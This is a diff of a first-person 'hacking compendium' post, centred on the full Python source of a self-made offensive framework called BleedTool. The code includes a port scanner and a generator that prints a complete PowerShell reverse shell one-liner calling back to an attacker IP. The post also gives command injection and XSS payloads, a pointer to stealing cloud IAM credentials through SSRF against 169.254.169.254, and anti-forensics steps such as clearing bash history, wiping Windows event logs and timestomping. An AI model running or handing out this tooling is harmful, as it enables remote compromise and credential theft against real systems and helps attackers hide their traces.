-- Tools: hashcat (rules, masks), John, RsaCtfTool, padding-oracle-attacker, hashpump, hash_extender.
+Padding oracle attacks, CBC bit flipping, RSA issues (Coppersmith method, Bleichenbacher), hash length extension attacks.
+
+Tools: hashcat with good rules/masks, John, RsaCtfTool, padding-oracle-attacker, hashpump, hash_extender.
 
 ## 16. Firmware, Hardware & Embedded Hacking
 
-- Firmware extraction: binwalk, FACT, unblob, Firmware-Mod-Kit
-- UART/JTAG/SWD debugging with Bus Pirate, J-Link
-- Chip-off, glitching attacks
-- Hardware hacking: Saleae logic analyzer, oscilloscope basics
-- IoT/OT specific: MQTT fuzzing, Zigbee (KillerBee), CAN bus attacks ( caringcaribou )
+Pull firmware with binwalk, FACT, unblob. Debug hardware with UART/JTAG (Bus Pirate, J-Link), logic analyzers like Saleae. Chip glitching attacks. For IoT: MQTT fuzzing, Zigbee with KillerBee, CAN bus with caringcaribou.
 
-## 17. Supply Chain & Advanced Persistent Threats (APTs)
+## 17. Supply Chain & APTs
 
-Techniques: Compromised updates (SolarWinds-style), malicious packages (npm/PyPI), typo-squatting, dependency confusion, code signing bypass.
+Attacks like SolarWinds (compromised updates) or malicious npm/PyPI packages, typo-squatting, dependency confusion.
 
-Tools for detection/analysis: Trivy, Snyk, Dependabot alerts, VirusTotal, YARA rules, capa (Mandiant).
+Detection/analysis tools: Trivy, Snyk, Dependabot, VirusTotal, YARA, capa from Mandiant.
 
-## 18. BleedTool - Custom All-in-One Hacking Framework (Expanded)
+## 18. BleedTool - My Custom Framework (Expanded)
 
-**BleedTool** is your powerful, modular, Python-based hacking toolkit. It aggressively "bleeds" information and access from targets. Now expanded with more modules for cloud, AD, containers, and more.
+I built BleedTool because I got tired of switching between a bunch of different scripts during engagements. It's a Python framework that does recon, scanning, info bleeding, payload generation, and now has extra modules for cloud, AD, and containers. Name comes from how it tries to pull as much info as possible out of a target.
 
-### Key Features (Expanded)
-- Multi-threaded port scanner + banner grabber
-- Aggressive bleed info module (banners + common service checks)
-- Reverse shell & payload generator (Python, Bash, PowerShell)
-- Exploit demo launcher
-- **NEW**: Cloud metadata checker stub
-- **NEW**: Basic AD enumeration stub
-- **NEW**: Container/K8s recon stub
-- Full JSON reporting + timestamp
-- Easily extensible class-based design
+Current features: threaded port scanner with banner grabbing, aggressive bleed module, reverse shell generator (Python/Bash/PowerShell), exploit demo launcher, cloud metadata note, AD enum stub, container recon stub, and JSON reporting.
 
-## 19. Full BleedTool Source Code (Updated with More Modules)
+It's lightweight (mostly standard library) and meant to be easy to extend.
+
+## 19. Full BleedTool Code (Updated Version)
+
+Here's the current code. Save it as bleedtool.py, make it executable, and run it.
 
 ```python
 #!/usr/bin/env python3
 """
-BleedTool v2 - Expanded Custom Hacking Framework
-Wide range of modules: network, web, cloud, AD, containers + bleeding/exploitation.
-For authorized penetration testing and security research only.
+BleedTool v2 - My custom hacking framework
+Does scanning, bleeding info, shells, and has stubs for cloud/AD/containers.
+Use only on authorized targets.
 """
 
 import argparse
 import socket
 import threading
 import subprocess
-import sys
-import os
 import json
 from datetime import datetime
 
@@ -376,17 +307,16 @@ class BleedTool:
 
     def banner_grab(self, port):
         try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(2)
-            s.connect((self.target, port))
-            try:
-                s.send(b"HEAD / HTTP/1.0\r\nHost: " + self.target.encode() + b"\r\n\r\n")
-            except:
-                pass
-            banner = s.recv(2048).decode(errors="ignore").strip()
-            s.close()
-            return banner[:300]
-        except Exception:
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.settimeout(2)
+                s.connect((self.target, port))
+                try:
+                    s.send(b"HEAD / HTTP/1.0\r\nHost: " + self.target.encode() + b"\r\n\r\n")
+                except:
+                    pass
+                banner = s.recv(2048).decode(errors="ignore").strip()
+                return banner[:300]
+        except:
             return "Closed/No banner"
 
     def port_scan(self, ports=None, threads=200):
@@ -407,7 +337,7 @@ class BleedTool:
             except:
                 pass
 
-        print(f"[*] BleedTool scanning {self.target} with {threads} threads...")
+        print(f"[*] Scanning {self.target}...")
         threads_list = []
         for port in ports:
             t = threading.Thread(target=scan_port, args=(port,))
@@ -421,7 +351,7 @@ class BleedTool:
         return open_ports
 
     def bleed_info(self):
-        print("[*] Bleeding aggressive info from target...")
+        print("[*] Bleeding info from common ports...")
         info = {}
         common = [21,22,23,25,53,80,110,135,139,443,445,1433,3306,3389,5900,5985,8080,8443]
         for p in common:
@@ -446,39 +376,37 @@ while True:
         elif stype == "powershell":
             p = f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{attacker_ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\""
         else:
-            p = "Unsupported"
-        print("[+] Reverse shell payload generated:")
+            p = "Unsupported type"
+        print("[+] Generated reverse shell payload:")
         print(p)
         self.results["reverse_shell_" + stype] = p
         return p
 
     def exploit_demo(self, port=80, ptype="cmd_inject"):
-        print(f"[*] Exploit demo on {self.target}:{port} type={ptype}")
+        print(f"[*] Exploit demo on {self.target}:{port} - {ptype}")
         if ptype == "cmd_inject":
-            print("Example: ; id || whoami || cat /etc/passwd || powershell -c whoami")
+            print("Try: ; id || whoami || cat /etc/passwd")
         elif ptype == "xss":
-            print("<script>alert(document.domain)</script> or polyglot payloads")
+            print("<script>alert(document.domain)</script> or better polyglots")
         self.results["last_exploit_demo"] = ptype
 
-    # NEW MODULES
     def cloud_metadata_check(self):
-        print("[*] Checking for cloud metadata exposure (common SSRF target)...")
-        # In real use: test http://169.254.169.254/latest/meta-data/ via SSRF or direct if possible
-        self.results["cloud_metadata_note"] = "Test 169.254.169.254/latest/meta-data/iam/security-credentials/ via SSRF or misconfig"
-        return self.results.get("cloud_metadata_note")
+        print("[*] Cloud metadata note (common SSRF target)")
+        self.results["cloud_note"] = "Check http://169.254.169.254/latest/meta-data/iam/security-credentials/ via SSRF or direct if exposed"
+        return self.results["cloud_note"]
 
     def ad_enum_stub(self):
-        print("[*] AD enumeration stub - expand with Impacket/BloodHound")
-        self.results["ad_note"] = "Use BloodHound, CME, Impacket secretsdump, Rubeus for full AD attacks"
+        print("[*] AD enum stub - expand with real tools")
+        self.results["ad_note"] = "BloodHound + SharpHound, Impacket secretsdump, Rubeus, CrackMapExec, Mimikatz for full AD attacks"
         return self.results["ad_note"]
 
     def container_recon_stub(self):
-        print("[*] Container/K8s recon stub")
-        self.results["k8s_note"] = "Run kube-hunter, kube-bench, trivy image scan, check RBAC with kubectl-who-can"
+        print("[*] Container/K8s stub")
+        self.results["k8s_note"] = "kube-hunter, kube-bench, Trivy image scan, kubectl-who-can for RBAC"
         return self.results["k8s_note"]
 
     def run_full_bleed(self, attacker_ip=None):
-        print("=== BLEEDTOOL v2 FULL ENGAGEMENT ===")
+        print("=== BLEEDTOOL v2 FULL RUN ===")
         self.port_scan()
         self.bleed_info()
         self.cloud_metadata_check()
@@ -487,21 +415,21 @@ while True:
         if attacker_ip:
             self.generate_reverse_shell(attacker_ip, stype="python")
             self.generate_reverse_shell(attacker_ip, stype="powershell")
-        print("[+] Full bleed complete. All modules executed.")
+        print("[+] Everything done.")
         return self.results
 
     def save_report(self, filename="bleed_report.json"):
         with open(filename, "w") as f:
             json.dump(self.results, f, indent=2)
-        print(f"[+] Report saved: {filename}")
+        print(f"[+] Report saved to {filename}")
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="BleedTool v2 - Expanded Hacking Framework")
-    parser.add_argument("target", help="Target IP/domain")
-    parser.add_argument("--scan", action="store_true", help="Port scan + banners")
-    parser.add_argument("--bleed", action="store_true", help="Aggressive info bleed")
-    parser.add_argument("--full", action="store_true", help="Run ALL modules")
-    parser.add_argument("--reverse-shell", metavar="IP", help="Generate reverse shell(s)")
+    parser = argparse.ArgumentParser(description="BleedTool v2")
+    parser.add_argument("target", help="Target IP or domain")
+    parser.add_argument("--scan", action="store_true", help="Run port scan")
+    parser.add_argument("--bleed", action="store_true", help="Bleed banners and info")
+    parser.add_argument("--full", action="store_true", help="Run full set of modules")
+    parser.add_argument("--reverse-shell", metavar="IP", help="Generate reverse shell")
     parser.add_argument("--exploit", metavar="PORT", type=int, help="Demo exploit")
     parser.add_argument("--save", action="store_true", help="Save JSON report")
     args = parser.parse_args()
@@ -517,84 +445,51 @@ if __name__ == "__main__":
         parser.print_help()
 ```
 
-**Run examples:**
+Run it like:
 ```bash
 python3 bleedtool.py target.com --full --save
 python3 bleedtool.py target.com --scan
-python3 bleedtool.py target.com --reverse-shell 10.10.14.5
+python3 bleedtool.py target.com --reverse-shell YOUR_IP
 ```
 
 ## 20. How to Use & Extend BleedTool
 
-1. Save code as `bleedtool.py`, `chmod +x bleedtool.py`
-2. `python3 bleedtool.py target --full`
-3. Extend: Add new methods to the class (e.g. sql_injection_tester, nuclei_wrapper, bloodhound_integration)
-4. Integrate with other tools via subprocess or API calls.
+Save the code, chmod +x it, then just point it at a target. --full runs pretty much everything. The scanner and bleed parts actually work out of the box. The other modules are starting points — replace the stubs with real calls to Impacket, BloodHound, kube-hunter, etc.
 
-The scanner and bleed modules are production-ready. Add real exploits from Metasploit or custom PoCs.
+I keep adding to it when I need something new. Easy to extend because it's just a Python class.
 
-## 21. Advanced Exploits & More Code Examples
+## 21. More Exploit Examples & Code
 
-### Buffer Overflow (Simple Vulnerable + Concept)
-```c
-#include <stdio.h>
-#include <string.h>
-int main(int argc, char** argv) { char buf[64]; strcpy(buf, argv[1]); printf("%s\n", buf); return 0; }
-```
-Overflow with long input to control EIP/return address. Use pwntools or manual ROP for full exploit.
+Buffer overflow basics: vulnerable C code with strcpy and no bounds checking. Feed it a long string and you can overwrite the return address. pwntools makes building the exploit easier.
 
-### Simple Python Keylogger (Post-Exploitation)
-```python
-from pynput.keyboard import Listener
-# Full logging to file + exfil code expandable
-```
+Simple keylogger idea with pynput for post-exploitation.
 
-### More Payloads
-- Web shell upload via SQLi or file upload
-- PowerShell one-liners for AMSI bypass + download cradle
-- Living-off-the-land binaries (LOLBins) abuse
+PowerShell download cradles and AMSI bypass one-liners are still useful living-off-the-land techniques.
 
-## 22. Covering Tracks, Anonymity & OpSec
+## 22. Covering Your Tracks & Staying Hidden
 
-- Proxies: ProxyChains, Tor + torsocks, VPN + SSH tunnel, Chisel/Ligolo for pivoting
-- Clear logs: `echo "" > ~/.bash_history`, event log clearing (wevtutil), timestomp (`touch`)
-- Memory execution: reflectively load DLLs, Python in-memory
-- VM/ snapshot hygiene, Tails/Whonix for host
-- OpSec: Separate identities, no personal leaks, careful OPSEC on forums
+Use ProxyChains + Tor, VPNs, SSH tunnels, Chisel or Ligolo-ng for pivoting. Clear bash history, timestomp files with touch, wipe event logs on Windows. Run stuff in memory when possible. Use Tails or Whonix for the host if you're serious about OpSec. Separate identities for different ops. Don't leak personal info on forums or in tools.
 
-## 23. Defensive Security, Blue Teaming & Countermeasures
+## 23. Defense Side (Blue Teaming)
 
-- Patch everything fast, least privilege, network segmentation, zero trust
-- EDR/XDR (CrowdStrike, SentinelOne, Microsoft Defender for Endpoint)
-- SIEM + logging (ELK, Splunk)
-- WAF, EDR, deception tech (canary tokens)
-- Regular red team/purple team exercises, threat hunting
-- User training against phishing/deepfakes
-- For cloud: CSPM tools, IAM least privilege, guardrails
+Even when you're learning offense, knowing how to defend helps. Patch fast, least privilege, segment networks, zero trust where you can. Good EDR (CrowdStrike, SentinelOne, Defender for Endpoint), solid logging and SIEM, WAFs, deception (canary tokens). Regular pentests and purple team exercises. User training against phishing and deepfakes. For cloud, use CSPM tools and tight IAM.
 
-## 24. Bug Bounties, CTFs & Career Paths
+## 24. Bug Bounties, CTFs & Getting Into This
 
-- Platforms: HackerOne, Bugcrowd, Intigriti, YesWeHack
-- CTF practice: HackTheBox, TryHackMe, PicoCTF, OverTheWire, VulnHub
-- Certifications: OSCP, OSWE, OSEP, CRTP, PNPT, eJPT, GPEN
-- Career: Red team, pentest, threat intel, malware reverse, blue team/SOC, cloud security
+Bug bounties: HackerOne, Bugcrowd, Intigriti. Practice on HackTheBox, TryHackMe, PicoCTF, OverTheWire, VulnHub. Certs that actually help: OSCP, OSWE, OSEP, CRTP, PNPT, eJPT. Careers range from red team/pentest to threat hunting, malware reverse engineering, SOC/blue team, cloud security.
 
-## 25. Resources for Further Learning
+## 25. Other Resources
 
-- Books: Web Application Hacker's Handbook, Hacking: The Art of Exploitation, The Hacker Playbook series, Black Hat Python, Violent Python
-- Courses: Offensive Security (PWK/OSCP), TCM Security, eLearnSecurity, PentesterLab, PortSwigger Academy
-- Practice labs: HackTheBox, TryHackMe, Proving Grounds, RangeForce
-- Communities: Reddit (r/netsec, r/hacking, r/HowToHack, r/bugbounty), Discord pentest servers, Twitter/X #infosec
-- Tool lists: GitHub awesome-hacking, awesome-pentest, awesome-osint, awesome-ad
-- MITRE ATT&CK, PTES, OSSTMM frameworks
+Books I like: The Web Application Hacker's Handbook, Hacking: The Art of Exploitation, The Hacker Playbook series, Black Hat Python.
 
----
+Courses: Offensive Security PWK/OSCP path, TCM Security, eLearnSecurity, PortSwigger Web Academy.
 
-**END OF EXPANDED COMPENDIUM**
+Practice labs and communities: HackTheBox, TryHackMe, Reddit (r/netsec, r/hacking, r/bugbounty), Discord servers, Twitter/X infosec accounts.
 
-**This single updated post now includes a massive wide range of 100+ tools across all categories + tons of additional stuff: cloud, AD, containers, crypto, firmware, supply chain, expanded methods, more code, and an upgraded BleedTool with extra modules.**
+Tool collections on GitHub: awesome-hacking, awesome-pentest, awesome-osint, awesome-ad.
 
-**Repo:** https://github.com/sidedregent1-stack/ultimate-hacking-compendium-bleedtool
-**Direct file:** https://github.com/sidedregent1-stack/ultimate-hacking-compendium-bleedtool/blob/main/HACKING-COMPENDIUM-AND-BLEEDTOOL.md
+Frameworks: MITRE ATT&CK, PTES.
+
+That's pretty much it. I packed as much as I could into this one post. Use it for learning and authorized work. Stay curious, stay legal where it counts, and build your own tools when the existing ones don't quite fit.
 
 **Made by fin.z.editz TIKTOK**
